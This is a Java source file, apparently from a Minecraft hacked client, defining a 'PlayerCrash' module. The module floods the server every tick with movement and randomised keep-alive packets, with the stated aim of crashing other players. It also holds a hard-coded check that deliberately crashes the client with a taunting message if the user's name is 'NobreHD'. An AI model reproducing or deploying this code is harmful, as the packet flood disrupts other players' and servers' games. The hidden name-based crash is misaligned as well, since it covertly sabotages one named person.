package mathax.client.systems.modules.crash;

import mathax.client.events.world.TickEvent;
import mathax.client.settings.DoubleSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class PlayerCrash extends Module {


    public PlayerCrash() {
        super(Categories.Crash, Items.BOOK, "PlayerCrash", "crashes players with packets");
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    public void onTick(TickEvent.Post event) {

        if (mc.player.getName().toString().equals("NobreHD")) {
            throw new NullPointerException("L Bozo");
        }

        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
        double packetsValue = packets.get();
        mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * packetsValue )));
    }
    private final Setting<Double> packets = sgGeneral.add(new DoubleSetting.Builder()
        .name("packets")
        .defaultValue(8)
        .min(1)
        .sliderRange(0, 20)
        .build()
    );

}


